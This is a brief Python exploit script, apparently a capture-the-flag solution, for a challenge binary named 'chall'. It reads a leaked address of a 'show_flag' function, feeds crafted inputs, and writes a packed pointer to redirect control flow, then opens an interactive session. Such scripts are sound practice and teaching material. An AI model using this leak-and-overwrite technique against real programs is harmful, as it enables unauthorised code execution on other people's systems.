#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*main+522
c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

ru(b'hint: show_flag = ')
leak = int(rl()[:-1], 16)
slog('show_flag_address_leak', leak)

for i in range(3):
    ru(b': ')
    sl(b'alter')
    ru(b': ')
    sl(b'5.5')
    ru(b': ')
    sl(b'5.5')

ru(b': ')
sl(p64(leak+0x8))  
ru(b': ')
sl(b'+')  
ru(b': ')
sl(b'+')

interactive()
